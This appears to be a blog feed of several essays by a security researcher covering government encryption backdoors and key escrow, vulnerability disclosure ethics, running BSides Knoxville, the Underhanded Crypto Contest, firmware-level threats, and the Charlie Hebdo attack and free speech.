      <title>The Door to Nowhere</title>
      <description><p><img class="left" src="https://adamcaudill.com//files/door_to_nowhere.jpg"></p>

<p>Today I was walking around, exploring the local downtown area, and I noticed a door. Or more accurately, what used to be a door, and the symbolism was too perfect to ignore. It’s a door to nowhere.</p>

<p>A door once stood here, carefully built, thoughtfully placed, well crafted. Long ago someone decided that they didn’t want the door to exist anymore — so they filled it in. They made an attempt at reversing the decisions of the past to suit their desire at the moment — but they couldn’t.</p>

<p>What stands now is a scar, a flawed edifice, a clear sign that someone tried, and yet failed to change reality.</p>

<p>The door, though forever closed, can not be erased.</p>

<hr />

<p><img class="center" src="https://adamcaudill.com//files/the_fool.jpg"></p>

<p>The FBI Director is trying to do something very similar. James Comey is trying his best to close the door to cryptography for Americans, in a vain attempt to roll back the clock to a time when Americans didn’t have easy access to strong and easy to use encryption tools. A friend of mine summed up his efforts better than anyone else:</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p lang="en" dir="ltr">Crypto debate in a nutshell: At first there was no crypto. Great for law enforcement! Now there&#39;s crypto. Law enforcement wants to go back</p>&mdash; Tony Arcieri (@bascule) <a href="https://twitter.com/bascule/status/673647245426737153">December 6, 2015</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>That is, in a nutshell, what’s going on — between the creation of the internet, and the wide scale deployment of encryption, law enforcement had it easy. Getting information was simple; now it’s not and they want to go back to things being easy for them. Why actually investigate when you can just have companies deliver all the information to you? If one is to believe the narrative that Comey is pushing, you’d have to believe that the FBI was entirely useless prior to the creation of the internet.</p>

<p>In the past Comey has called for <a href="https://theintercept.com/2015/07/08/fbi-director-comey-proposes-imaginary-solution-encryption/">magical solutions</a> to allow the US Government to have access to data, while somehow keeping it secure from everyone else. Everyone that understands cryptography immediately made it clear just how ridiculous that idea is. Now, Comey has a new tactic — declare that there is <a href="https://theintercept.com/2015/12/09/comey-calls-on-tech-companies-offering-end-to-end-encryption-to-reconsider-their-business-model/">no technical problem</a> with backdooring systems.</p>

<p>Instead of trying to understand the problem, the FBI’s position is now to just pretend it doesn’t exist.</p>

<p>The goal of the FBI now is to compel companies, by political pressure or legislation, to add backdoors to their systems, to allow them (and hackers, and malicious employees, etc.) to bypass encryption and provide the US Government with clear text. Or, put more simply, the goal is to <strong>eliminate end-to-end encryption</strong>.</p>

<p>Yet, the door as been opened — strong cryptography is readily available. So, how does Comey see this little fact?</p>

<blockquote><p>I think there’s no way we solve this entire problem. … The sophisticated user could still find a way.</p></blockquote>


<p>They understand that those that are motivated to hide, such as the terrorists they are purportedly targeting with these calls to control encryption, will still use strong encryption. Yet they call for average Americans to lose access to end-to-end cryptography.</p>

<p>Any legislative option would only apply to American companies — <a href="https://www.silentcircle.com/">Silent Circle</a> for example, left the country in 2014 to get away from the problems with the US legal system. Should such legislation be enacted, smaller players would likely follow very quickly. With issues, such as the collapse of the US-EU Safe Harbor due to the US failing to live up to its privacy requirements, life has already been getting harder for the larger US-based companies; they may just opt to leave as well.</p>

<p>By trying to force US companies to backdoor their own systems for the convenance of the FBI, knowing that those that are motivated to encrypt will do so, the real loser is the American people &amp; companies. Foreign countries will be able to offer more secure products, terrorists and criminals will still be just as able to use strong encryption as they are now, life will be easier for hackers and malicious employees that want to steal data.</p>

<p>As a final demonstration of the short-sighted foolishness of the FBI’s mission to keep end-to-end encryption away from Americans, they seem to completely fail to understand that other governments will demand access to these backdoors as well — this action would simplify state-sponsored corporate espionage, as well as monitoring US officials.</p>

<p>Comey wants to change the past, yet at worst, all he will be able to do is leave a scar on America.</p>

      <title>Responsible Disclosure Is Wrong</title>
      <description><p>The debate around how, where, and when to disclose a vulnerability - and of course to whom - is nearly as old as the industry that spawned the vulnerabilities. This debate will likely continue as long as humans are writing software. Unfortunately, the debate is hampered by poor terminology.</p>

<blockquote><p>Responsible disclosure is a computer security term describing a vulnerability disclosure model. It is like full disclosure, with the addition that all stakeholders agree to allow a period of time for the vulnerability to be patched before publishing the details.</p></blockquote>


<p>This is how Wikipedia defines responsible disclosure — but the person that coined the term has stepped away from it, advocating “coordinated disclosure” instead. To me, this makes perfect sense - if you go by the Wikipedia definition, coordinated disclosure is a better fit, it closely matches how the term is being use by vendors. <em>The problem is that coordinated disclosure isn’t necessarily responsible — and full disclosure isn’t necessarily irresponsible</em>.</p>

<p>The term is a bit of a misnomer really — as researchers our responsibility is to users, though often the term is seen as meaning a responsibility to vendors. This is the biggest issue I have with the term, it’s used as focusing on the wrong group in a disclosure. As a security researcher my responsibility is to make the world a safer place, to protect the users, not to protect the name of a vendor.</p>

<p>Based on this, I would say that responsible disclosure is wrong - or more accurately, how it’s been defined is wrong. As defined, what we get from the term is a one-sided view on the disclosure process and its goals. I like the term, but the definition doesn’t suit the reality of vulnerability disclosure.</p>

<h2>Sensible Disclosure</h2>

<p>Perhaps we need a better term to describe real world disclosures - full disclosure and coordinated disclosure are both potential outcomes of the sensible disclosure process. Every step in the decision process needs to factor in what’s best for users.</p>

<p>Let’s look at what a truly responsible disclosure decision process needs to include - decisions that are ignored by the simplistic definition used by responsible disclosure today. This is far from complete of course, these are just high level question that need consideration; there are considerations that are more specific to situations that can have a dramatic impact on what the right decision is.</p>

<p><strong>Can users take action to protect themselves?</strong> If you release details publicly, are there concrete steps that individual users and companies can take to protect themselves?</p>

<p><strong>Is it being actively exploited?</strong> If a vulnerability is being actively exploited, the focus has to shift to minimizing damage - this can change value of other factors drastically.</p>

<p><strong>Is the issue found with minimal effort?</strong> Is the vulnerability something difficult, or something that anyone would notice of they looked in the right place? If it’s something that anyone would notice, how likely is it that others have already found it, and are using it maliciously? Even if you don’t have evidence that something is being exploited in the wild, it’s still quite possible, and this needs to be considered.</p>

<p><strong>Is the issue something that can be corrected without major effort?</strong> Some issues are simple — a few lines of code and it’s gone, others are difficult to impossible to fix.</p>

<p><strong>If patched today, how are users impacted?</strong> With some flaws, apply a patch to code and you are done — with others, there is still clean up to do. For example, errors in cryptography can mean that messages aren’t protected as they should be; this means that every message that is encrypted expands the issue and increases risk, that isn’t addressed once patched. There is also the related issue of backwards compatibility — breaking systems by fixing the flaw, or requiring substantial cleanup (think re-encrypting large amounts of data).</p>

<p><strong>Is the vendor responsive?</strong> Vendors have a responsibility to respond quickly, and to take action quickly to address reported vulnerabilities. Are they responding at all? Are they trying to address the issue, or just keep the issue away from the press for as long as possible? If the vendor isn’t acting, is more pressure needed to get the issue resolved? Another important question when evaluating vendor response — remember, they are likely addressing other issues as well, which may be more severe; as such, something that you think is critical, may deserve less attention than other bugs that you aren’t aware of.</p>

<p><strong>How severe is the issue?</strong> Is this an earth-shattering vulnerability that those affected would take drastic actions if they were aware, or is this something minor that is an issue, but not quite deserving of panic?</p>

<p>Sensible Disclosure should include evaluation of all of these, and then proceeding to coordinated disclosure or full disclosure, or some hybrid — based on what’s best for those impacted. This is full of nuance, full of subtleties — it’s not the black and white “<em>tell us, only us, and we’ll tell you when you can say something</em>” policy that vendors like, but it provides a path to acting in the interest of users first.</p>

<h2>Users First, Always</h2>

<p>There is nothing wrong with coordinated disclosure — this should be the goal: quick vendor response, protecting users as quickly as possible with minimal or no malicious use of a flaw. Generally speaking, contacting the vendor should be the first step, and hopefully they act quickly and the rest of the process is then easy; sometimes though they don’t, sometime full disclosure is the only option to get them to act. Sometimes the delay of working with the vendor would put people at risk.</p>

<p>For a security researcher, in general, full disclosure should be the last resort, pulled out when working with the vendor has failed. There are some cases where getting the word out quickly is more important though — it depends on the vulnerability, and the impact to those affected.</p>

<p>Each and every decision made in a disclosure process should be focused on the users, and what protects them best — some vulnerabilities require so much research, and are so difficult to exploit that taking a year to secretly fix it is fine. Others, every day that goes by moves users closer to disaster; most others are somewhere in between.</p>

<p><em>There is no one size fits all solution for vulnerability disclosure.</em> That simple, “responsible disclosure” doesn’t address the subtitles that are actually involved. The term Sensible Disclosure may be closer to reality, though I don’t like it as much.</p>

<p>Be responsible, protect users — practice sensible disclosure.</p>

      <title>Making BSides Knoxville</title>
      <description><p><a href="https://www.flickr.com/photos/126993760@N05/17709785102/in/album-72157652967513465/"><img class="center" src="https://farm9.staticflickr.com/8853/17709785102_8d6abf178b_z.jpg"></a></p>

<p>Two years of discussions, months of planning, weekly meetings, and thousands of dollars - BSides Knoxville 2015, the first BSides Knoxville that is, is in the books. By any metric I can think of, it was a resounding success - the feedback was great, awesome talks, good food, and a great atmosphere.</p>

<p>I would like to give a little insight into the event, some of what I learned from it, what went right, went wrong, and how to make something like this without going insane. Hopefully this will be useful for others thinking about running a small conference, or if you just want a behind the scenes view of what goes on.</p>

<h2>Time</h2>

<p>A conference of any size takes time to put together, and even a fairly small regional event is no different. The planning actually started in the summer of 2013, with an event planned for the spring of 2014 — that clearly didn’t happen. Venue quotes, preliminary budgets, talks with potential sponsors — altogether, several hundred hours of work went into the 2014 event before a painful decision had to be made.</p>

<p>Putting something like this together is hard — you truly have to juggle a thousand things at once, if you can’t dedicate the time needed to keep track of them all, things fall and the event fails. In May of 2014, we let the main BSides organization know that we put the event on hold, with no set date to resume. After so much work, this was a hard thing to do — but we wanted to do it right, and the team we had simply couldn’t put in enough time to make it happen. If we couldn’t make it the event Knoxville deserved, we weren’t going to do it.</p>

<p>At DerbyCon 2014, a few of us met and discussed the path forward to make the event happen — we still had a strong desire to make it happen, but it had to be right. After a number of conversations, it was clear that we needed to rebuild the core team.</p>

<p>The timing couldn’t have been better.</p>

<p>A couple weeks after DerbyCon, a message was relayed through the main BSides organization that someone else was interested in getting a BSides event in Knoxville. Perfect.</p>

<p>In November 2014 the regular meetings started, and ran through till a few days ago. Between the four person team, the time investment ranged from 10 hours to 40+ hours a week. Running the CFP, finding sponsors, negotiating with venues, badge design and manufacturing, and of course promoting the event.</p>

<p>The best lesson here was to find good tools and use them religiously — we coordinated everything through <a href="https://trello.com/">Trello</a>, and it worked out beautifully. Making the move to run everything through it might have been the best decision we made.</p>

<h2>Money</h2>

<p>Running a conference isn’t cheap, and without the generosity of the sponsors, it simply wouldn’t be possible. To give a rough idea, the cost per attendee was roughly $77 — we charged $10; the $67 difference was covered by the sponsors. So when I say it wouldn’t be possible without them, I’m really not kidding.</p>

<p>The cost of food &amp; drinks was, by far, our largest expense — making up over half of the budget. The badges made up the next largest cost — we really wanted to do something special, useful, memorable, and we hope we did it.</p>

<p>Getting the money necessary and determining the best way to use it to get the most bang for everyone involved is anything but simple. Of all the time we spent in the planning meetings, approximately half was spent discussing money.</p>

<h2>Team</h2>

<p>Without the team, both organizers and volunteers, there’s no way it would have happened. In total, there were four organizers and twelve volunteers. Having a good team is critical for the event’s success — without a good team of people that are willing to work hard, the event will have issues every step of the way.</p>

<p>Volunteering at a conference is a great way to learn about how to manage an event, and get an insight to the issues that you may have, and how to deal with them. For me, volunteering at BSides Las Vegas was a great experience — extremely educational, and something that everyone interested in running a conference should do.</p>

<p>For me, I was in charge of coordinating the staff, and I feel that I could have done a better job coordinating the team and promoting communication. This is my top personal item to improve for next year.</p>

<h2>Speakers</h2>

<p>We had 20 speakers and 14 talks, plus the keynote — the content, I think, was excellent. The feedback from the speakers was excellent, and the feedback on the quality of the talks couldn’t have been better.</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p lang="en" dir="ltr">Speaker gifts have arrived&#8230; <a href="http://t.co/gap4P5pKXL">pic.twitter.com/gap4P5pKXL</a></p>&mdash; BSidesKnoxville (@BSidesKnoxville) <a href="https://twitter.com/BSidesKnoxville/status/598814863184494592">May 14, 2015</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>One of the goals was to make sure that the speakers walked away with a positive feeling about the event, and would remember it for years to come. We had custom flasks made, speaker areas for each track stocked with snacks and drinks, walk-out music, and so forth — all with the goal of making sure that all of the speakers would walk away looking forward to next year.</p>

<p>The one area where I think we failed the speakers, is that we didn’t accurately judge which talks would need the most space — leading to a couple cases where the smaller area was completely packed, and the larger area had half the seats empty. This is something we will do better next year.</p>

<h2>Overall</h2>

<p>We had a target of 200 people, including staff and speakers — and we sold out around a month before the event. Had we been able to open up more spots, we likely could have increased this number by quite a bit. There’s a huge interest in the Knoxville area for this kind of event. For our first year, the response was incredible.</p>

      <title>Crypto Front Door: Everyone Welcome!</title>
      <description><p><img class="center" src="https://adamcaudill.com//files/backdoor_frontdoor.png"></p>

<p>For decades, the US Government has fought — sometimes with itself — to prevent the use of secure cryptography. During the first <a href="https://en.wikipedia.org/wiki/Crypto_Wars">crypto war</a>, they allowed strong cryptography within the US, but other countries were limited to small keys — making brute force attacks practical. But what about those pesky US citizens? They didn’t really want them to have strong crypto either — enter key escrow.</p>

<h3>What is key escrow?</h3>

<p>According to <a href="https://en.wikipedia.org/wiki/Key_escrow">Wikipedia</a>:</p>

<blockquote><p>Key escrow is an arrangement in which the keys needed to decrypt encrypted data are held in escrow so that, under certain circumstances, an authorized third party may gain access to those keys. These third parties may include businesses, who may want access to employees’ private communications, or governments, who may wish to be able to view the contents of encrypted communications.</p></blockquote>


<p>Essentially, it’s a system where someone other than the the owner of the data gets a copy of the key, that can be used to decrypt, without their permission.</p>

<p>If the organization holding the escrow keys can surreptitiously access the data — such as retrieving it from a service provider, or capture the data from a public network, the data can be decrypted in complete secrecy. The owner of the key need not have any idea that it’s happened, or who did it. This property raises many privacy concerns — this takes a technical control and turns it into a policy matter.</p>

<p><span class='pullquote-right' data-pullquote='if there’s nothing other than a piece of paper protecting your data, it isn’t protected'>
In general, if there’s nothing other than a piece of paper protecting your data, it isn’t protected at all. In the case of government controlled key escrow, that’s exactly the situation. If an employee violates policy and accesses escrow keys without authorization, they have the potential to secretly access data — and it’s quite possible it would never be known by anyone. In every environment, from the NSA to the Certificate Authority system, where controls are purely policy based instead of being technical, have been bypassed for various purposes.
</span></p>

<p>The most famous, or perhaps infamous, use of key escrow was the fundamentally flawed <a href="https://en.wikipedia.org/wiki/Clipper_chip">Clipper chip</a> — an attempt by the US Government to allow encrypted calls, while allowing them easy access. Thankfully, this effort died, mostly taking key escrow with it — at least for a few years.</p>

<h3>A rose by any other name…</h3>

<p><img class="center" src="https://adamcaudill.com//files/backdoor_this_big.png"></p>

<p>The Director of the NSA, Michael Rogers, has repeatedly called for the introduction of a “frontdoor” — which is a backdoor with a policy that says they have paperwork to do before they can use the keys they hold. The people of America, and the world, are to trust the secret rubber stamp court and the policies of various agencies with our most sensitive information — hoping they follow their own rules (which are probably also secret).</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p>Michael Rogers:I dont want a back door,I want a front door and I want the front door to have multiple locks,big locks <a href="http://t.co/PT0GzKn4X8">http://t.co/PT0GzKn4X8</a></p>&mdash; ISIK MATER (@isik5) <a href="https://twitter.com/isik5/status/587490182380843008">April 13, 2015</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>While Rogers has done his best to convince people that there’s a difference, the fact is no matter what you call a backdoor — it’s still a backdoor. It’s still a way for someone that isn’t the owner of the data, to decrypt it, without their approval and quite possibly without their knowledge.</p>

<p>That looks just like the definition of the word backdoor:</p>

<blockquote><p>a feature or defect of a computer system that allows surreptitious unauthorized access to data.</p></blockquote>


<h3>Massively Increased Complexity</h3>

<p>The privacy concerns and potential for abuse aren’t the only cost for key escrow — the complexity of the system is greatly increased, and as with any systems, when complexity goes up, so does the risk of vulnerabilities. The risks are so clear, that even the US Government can’t agree on the plan — NIST has already spoken out against it.</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p>NIST now the first agency within US gov to say that crypto frontdoors are a bad idea. <a href="http://t.co/FXF7Uwfotg">http://t.co/FXF7Uwfotg</a> <a href="http://t.co/53ziECkcsQ">pic.twitter.com/53ziECkcsQ</a></p>&mdash; Christopher Soghoian (@csoghoian) <a href="https://twitter.com/csoghoian/status/586646988269162496">April 10, 2015</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>Rogers said: “<em>I want a front door. And I want the front door to have multiple locks.</em>” — what he’s really talking about is key escrow with splitting. In other words, taking a key and splitting it into two or more pieces, and these pieces would be held by separate entities. The data could only be decrypted when one entity shared their half of the key with the other (intentionally or otherwise).</p>

<p>This adds complexity in a few ways:</p>

<ul>
<li>Key Splitting — The splitting process has to be done properly to ensure that neither entity would be able to recover the full key without the cooperation of the other.</li>
<li>Key Registration — When the encryption key is generated, it has to be split, and registered with the entities that will hold the parts. There are risks of data being lost in a number of ways here, and this registry would be a natural target for attack.</li>
<li>Key Part Transport &amp; Storage — Being a natural target for attack, the key parts need to be carefully handled throughout their lifetime.</li>
<li>Key Recovery — Certain paperwork would be required to access the  key parts, this would be validated by a human — should that human ignore policy, or not verify paperwork, keys could be accessed without the proper authorization.</li>
<li>Key Destruction — Once authorization expires, or the need for access has ended, the combined key and any copies of the key parts outside of the registry should be destroyed. If not properly handled, it would provide another avenue for unauthorized access.</li>
</ul>


<p>Of course this is just a high level view, and there’s more — all of these additions, unnecessary today, add risks of flaws (accidental or intentional) that could expose data.</p>

<h3>Opening the floodgates…</h3>

<p>One of the most astounding things to me about this proposal is the level of arrogance it demonstrates. The NSA (and similar organizations) has a strong preference for NOBUS (nobody but us) backdoors, and they are making the daring assumption that this will be a NOBUS backdoor.</p>

<p>For example, if the US Government receives a copy of iPhone encryption keys, a device made in China, do they really believe that the Chinese Government won’t take advantage of the situation to get a copy of the key as well? The US Government has set a clear precedent of using secret court orders to retrieve data — what makes them think that China would hesitate to order Foxconn’s facility in Shenzhen to provide it with a copy of all escrow key parts?</p>

<p>For companies with offices  outside of the US, or that deal with manufacturers outside of the US, there is real risk of them being targeted to get the keys before being delivered to the government. This is the same technique that <a href="https://firstlook.org/theintercept/2015/02/19/great-sim-heist/">GCHQ used against Gemalto</a> to get keys for SIM cards.</p>

<p>To assume that the US Government can open Pandora’s box, and yet maintain control is sheer arrogance. This opens the door not only to vulnerabilities, but to other governments that want to get in on the game. Once the requirement is set, it <em>will</em> be widely abused.</p>

      <title>On the Underhanded Crypto Contest</title>
      <description><p>On August 15th of last year I asked if anybody would be interested in a contest for the best, most evil underhanded crypto techniques — the response was clear, and less than a month later I announced the creation of the contest.</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p>Proudly announcing, the <a href="https://twitter.com/hashtag/UnderhandedCrypto?src=hash">#UnderhandedCrypto</a> Contest! See here for details / rules: <a href="https://t.co/mNV0KCVdLu">https://t.co/mNV0KCVdLu</a></p>&mdash; Adam Caudill (@adamcaudill) <a href="https://twitter.com/adamcaudill/status/507316560240066561">September 3, 2014</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>Before I go any further, the <a href="https://underhandedcrypto.com/">contest</a> simply wouldn’t have been possible without the huge effort by <a href="https://defuse.ca/">Taylor Hornby</a> to help organize, coordinate and communicate. I couldn’t have asked for a better co-organizer for this event.</p>

<p>Just over six months after the announcement, yesterday we finally announced the winners (only two months later than planned).</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p>Officially announcing the winners! <a href="https://t.co/5egBEis7xQ">https://t.co/5egBEis7xQ</a> Congrats John Meacham &amp; Gaëtan Leurent</p>&mdash; Underhanded Crypto (@UnderCrypto) <a href="https://twitter.com/UnderCrypto/status/574355268848517120">March 7, 2015</a></blockquote>

<p>The winners, and really all of those that entered, put an amazing amount of effort into it. The entries were fantastic, and quite honestly a few people found them a bit scary - simple, subtle, effective. This is exactly what we wanted though.</p>

<p>The goal of the contest, and the driving reason that we required the submissions be under an open license, was to provide researchers, developers, and reviewers with better insight into how these flaws can be introduced — and hopefully how to detect them.</p>

<p>Based on the comments we’ve received on the winners, I think this will certainly show how subtle these attacks can be. It’s our hope that this turns into a valuable training resource for the community, and will lead to fewer backdoors — intentional or otherwise.</p>

<p>We are discussing plans for the next Underhanded Crypto Contest now, and we’ll be announcing something soon.</p>

      <title>The Evolution of Paranoia</title>
      <description><p>That researchers from Kaspersky Lab uncovered malware that uses <a href="https://blog.kaspersky.com/equation-hdd-malware/">hard-drive firmware</a> has now been throughly discussed — perhaps too much for some people. It’s not exactly Earth-shattering news either, the idea has been discussed for years, and has been <a href="http://spritesmods.com/?art=hddhack">publicly demonstrated</a>. <a href="http://brandonw.net/">Brandon Wilson</a> and I were even working proof of concept for SSD controllers to demonstrate this based on our <a href="http://adamcaudill.com/2014/10/02/making-badusb-work-for-you-derbycon/">BadUSB</a> work.</p>

<p>This isn’t about that story, exactly. This is about paranoia, and how it has changed over the last few years — and even the last few months.</p>

<p>I was talking to Brandon Wilson about the implications of Kaspersky’s discovery, and how, or even if, you could ever trust your platform. When you could have malicious firmware in key system components — hard drive, USB devices (keyboard, mouse, etc.), USB hub — and possibly others, how about the GPU or the webcam that’s in virtually all laptops, how could you ever feel secure? How would you ever even know about it? Every device that has updatable firmware is a possible target, and far too few of them use any form of effective security to prevent malicious changes.</p>

<p>I pointed out that I buy all of my computers and key hardware from stores, I don’t have any of it delivered. Why? <a href="http://www.forbes.com/sites/erikkain/2013/12/29/report-nsa-intercepting-laptops-ordered-online-installing-spyware/">Interdiction</a>.</p>

<p>If it has my name associated with it prior to being in my hands, how do I know that it’s not been tampered with? Prior to Edward Snowden, I would have said that it was paranoid, that taking such precautions was at best a waste of time and at worst a sign of delusion. Today? If you are working in a field where you could have useful information, it seems quite reasonable. Paranoia has evolved, it has changed, what was once unreasonable is now prudent.</p>

<p>It was of course known that such things were possible before Snowden, but the scale was unknown — and of course NSA and the FBI aren’t the only threats, if they are doing something, you can bet they are far from alone. When that Lenovo laptop was shipped from China, do you really think that the Chinese Government wouldn’t take that chance to step in to gather some extra information? Launch-day iPhones have been shipped directly from China, and so many other examples. If NSA can tamper with a shipment, so can any country that has even temporary access to a package; if it’s on their land, they can attack it.</p>

<p>The focus has been on what NSA does, but the information should be used not as a way to attack NSA, but to get an insight to the  global threats that everybody that could be of interest faces. It’s important to remember that they don’t just <a href="http://www.theregister.co.uk/2014/02/03/nsa_gchq_accused_of_hacking_belgian_smartcard_crypto_guru/">target</a> <a href="http://arstechnica.com/tech-policy/2013/11/uk-spies-continue-quantum-insert-attack-via-linkedin-slashdot-pages/">terrorists</a>.</p>

<p>I recently had a person contact me, concerned that a device she had was compromised — while I could tell her that unless she was attracting attention from a major player she was likely safe, I couldn’t tell her that she actually was safe, or anything she could do to ensure that nothing was infected. As these techniques spread to more common attackers, the risks that average people will be targeted grows dramatically. Attacks not only get better over time, they become more widespread. From repressive regimes that outsource their attacks, to poorly supervised local law enforcement, to common malware — it’s only a matter of time.</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p>Today&#39;s NSA malware is tomorrow&#39;s everywhere malware. Defenders are so screwed.</p>&mdash; Matthew Green (@matthew_d_green) <a href="https://twitter.com/matthew_d_green/status/567869974246596609">February 18, 2015</a></blockquote>

<p>Defending against these attacks, without major changes from device manufacturers, is at best a nightmare; at worst, impossible. I have repeatedly called out USB controller manufacturers to secure their devices, as that’s the only way that BadUSB can be truly fixed. The same needs to be said for so many other device types — it’s up to device manufacturers to secure their products.</p>

<h2>The Chain of Trust</h2>

<p>For any system to be secure, there must be trust at some point, which can then ensure that later layers are correct and untampered. By attacking firmware, the chain is defeated at its first link — attack the hardware at the lowest level, and nothing that comes later, including the operating system, can truly be trusted.</p>

<p>The more important impact though is not technical, but psychological. If a person doesn’t know what they can or can’t trust, they start to fear everything. For NSA, GCHQ, and countless other agencies in the same business, this is good news — if people can’t trust their computers or their phones, they will turn to less secure means of communication. This is also extremely bad for consumers, business, and investors — as these tools can be used not just to go after government selected targets (legitimate or otherwise), but for profit, for blackmail, for revenge, or just for a thrill.</p>

<h2>Targets</h2>

<p>While the public focus of NSA is to combat terrorists, it’s been well documented that their targets go far beyond that — researchers, IT staff, business executives, you name it. Yet, I’m a citizen of the United States, and as such, I <em>shouldn’t</em> be a potential target for them (give or take being caught up because of people I know in other countries). Is that the end of the risk for me? No, not by a long shot.</p>

<p>While the <a href="https://en.wikipedia.org/wiki/Five_Eyes">Five Eyes</a> countries share intelligence, they don’t share restrictions on who they can spy on. For GCHQ, whether I’m a citizen of the United States or of Afghanistan makes no difference, I’m a valid target under their laws. Canada, Germany, Russia, China, Taiwan — I’m not protected under their laws, if they think I could have interesting information, or access to interesting information, on any topic, I could be a target. So could you. What information do you have access to, who do you know, and what information could they have access to?</p>

<p>If you work in security, development, IT, telecom — that could mean that you have access to some information that some country would like to have. Is that paranoia? A few years ago, some would say yes — now that we have a better insight into the scope and scale of intelligence activities, we know it’s simply reality.</p>

<h2>Personal Threat Models</h2>

<p>I have long encouraged people to have a personal threat model — what are your realistic threats? When talking to others, keep in mind that their threat model may be different than yours, and things you see as being paranoid could be quite prudent for them, due to the different risks they face.</p>

<p>For me, to be honest, I’m not that interesting to a foreign power — if anything, trading emails with Glenn Greenwald and trading tweets with people like <a href="https://twitter.com/thegrugq">the grugq</a> has done more to make me a target than any professional activity. The information I can access because of my job is somewhat interesting, and is certainly of value — but more to the Russian Mob than to a foreign government. I pay attention to who I talk to, to what I make public, to what my accounts have access to, so I know what my risks are.</p>

<p>If you work for a more interesting company, or are engaged in research that could be useful, or even just know people that could be more interesting than you, your threats could be completely different. Of course, also have to factor in locations — if you are outside of the US and work for a company that could have interesting information, then your threats may be far more complex.</p>

<p>Defining the line between reasonable and paranoid is harder than ever, and may vary from person to person.</p>

      <title>Religion, Free Speech &amp; Freedom from Offense</title>
      <description><p><a href="http://zombietime.com/mohammed_image_archive/islamic_mo_full/"><img class="center" src="https://adamcaudill.com//files/muhammad.jpg"></a></p>

<p>When I was a teenager I worked as a photojournalist and through that experience I learned just how important it is that the public, and the press in particular be able to speak openly, freely, and without restriction.</p>

<p>I also learned how important discretion is — I routinely worked events where people died, those people had families and they would see the photographs that documented the end of a life. Photos chosen for publishing had to be carefully picked, making the wrong choice could offend some, and truly hurt others. I saw people break down and cry when seeing photos I took — I saw the results of brash carelessness on families that were already hurting, already devastated.</p>

<p>I once was tasked with documenting a hate crime — a black effigy hung from a tree, followed shortly thereafter by a body found in a river — hands bound, and clearly related. People were scared, the mock hanging was a warning, and the body found proved that the threat was real. What gets shown and what doesn’t in cases like this is a very difficult choice. On one hand you risk offended and inciting fear — maybe even panic, on the other, you withhold useful information, stifle discussion, and risk leaving the truth sitting in a box, hidden from the world.</p>

<p>For all of the bad, there was also good — lives changed, hard questions asked, reforms enacted, true change made. This wasn’t done without stepping on toes though, hard decisions had to be made to find the right balance.</p>

<p>Making people comfortable is easy — give them what they want and no more. To make people think though, requires making them uncomfortable, requires pushing them outside of their comfort zone — and occasionally, offending them.</p>

<h2>The attack on Charlie Hebdo</h2>

<p>I firmly believe that journalism, legitimate journalism, is among the most critical tasks in a free society. Shining a light on the good and the bad — the eyes and ears of the people, too often the last chance for justice. When questions can’t be asked, when public figures are put beyond satire and debate, when some topics are unquestionably untouchable, then freedom dies. Slowly at first, then the line inches ever forward until the press is nothing but a mouthpiece for their puppet masters and feeding the public little more than entertainment - no challenges, no discomfort, no thought required entertainment.</p>

<p>Charlie Hebdo made a habit of making people uncomfortable — they attacked everyone and everything in power, they left nothing untouched. In doing so they offended almost everyone — some got mad and stomped away; others took it as a chance to reflect, not  only on the statement, but their own reactions, feelings, and beliefs; a few though decided that they needed to die for it.</p>

<p>Those at Charlie Hebdo worked despite threats and attacks, they continued in the face of danger. Every issue published was an act of bravery — sometimes tasteless, sometimes wantonly offensive, but still an act of bravery.</p>

<p>In a effort to silence the criticism of their preferred historical figure, a small group following an extreme and radical interpretation of a religion, took it upon themselves to silence journalists and artists by force. The goal though, went far beyond Charlie Hebdo — the attack was meant to send a wave of fear and terror throughout the world and leave journalists too afraid to say anything or risk a similar fate.</p>

<p>In the hours after the attack, there were clear indications that the extremists that sought to censor the world, may have actually <a href="http://www.huffingtonpost.com/2015/01/07/charlie-hebdo-censorship-cartoons_n_6431854.html">achieved that goal</a>. Publications around the world censored the cartoons of Charlie Hebdo, an act I consider to be cowardice, and willing, knowing capitulation. In the face of danger, some will choose to be brave and stand for what they believe — others will abandon what they believe readily when faced with the threat, or even the idea of danger.</p>

<p>Nothing is beyond ridicule, no person above satire — not political leaders, not Muhammad, not Jesus, not Zoroaster, not Zeus, not Ra, not Utu.</p>

<h2>#JeSuisCharlie</h2>

<p><a href="http://blog.erratasec.com/">Robert Graham</a> posted an <a href="https://twitter.com/ErrataRob/status/552862494684094464">image on Twitter</a> that immediately gave me mixed feelings; I agreed and disagreed all at the same time. On one hand, the image is the very definition of satire — it’s a strong point on the perception that these religious extremists are leaving many with. On the other hand, it could further inflame the situation,  insulting some and adding more energy to those that have shown they will not be subject to rational thought. It was also an act of defiance, a statement that he would not be censored, and a recommendation that others should follow his example and show that the world will not allow a group of extremists to define what’s acceptable.</p>

<p><img class="center" src="https://adamcaudill.com//files/jesuischarlie.png" width="299" height="338"></p>

<p>For those that are offended by this image, I’m sorry that you feel as you do — though I will offer no apology for posting it. Offending for the sake of offense should be avoided — and is an act I disagree with, offending for the sake of making a point though, is sometimes necessary.</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p>I rarely agree with H. Nasrallah but yes: &quot;Islamic extremists who slaughter people have done more harm to Islam than anyone else in history&quot;</p>&mdash; Karin Kosina (@kyrah) <a href="https://twitter.com/kyrah/status/553991337750827008">January 10, 2015</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


